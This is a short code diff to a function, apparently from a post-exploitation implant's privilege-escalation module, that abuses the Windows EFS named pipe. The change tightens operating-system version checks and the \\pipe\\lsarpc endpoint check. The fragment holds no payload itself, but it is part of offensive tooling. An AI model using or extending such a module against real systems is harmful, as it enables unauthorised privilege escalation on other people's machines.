@@ -49,8 +49,13 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: RtlGetVersion failed");
 		}
 
-		// Windows Vista / Server 2008 and prior only supports \pipe\lsarpc endpoint
-		if ((os.dwMajorVersion < 6) || (os.dwMajorVersion == 6 && (os.dwMinorVersion == 0 || os.dwMinorVersion == 1))) {
+		
+		if (os.dwMajorVersion < 6) {
+			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Windows versions older than 6.0 are unsupported");
+		}
+		// Windows Vista / Server 2008 only supports \pipe\lsarpc endpoint
+		else if ((os.dwMajorVersion == 6 && (os.dwMinorVersion == 0 || os.dwMinorVersion == 1))) {
 			if (!does_pipe_exist(L"\\\\.\\pipe\\lsarpc")) {
 				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\lsarpc is not listening.");
 			}
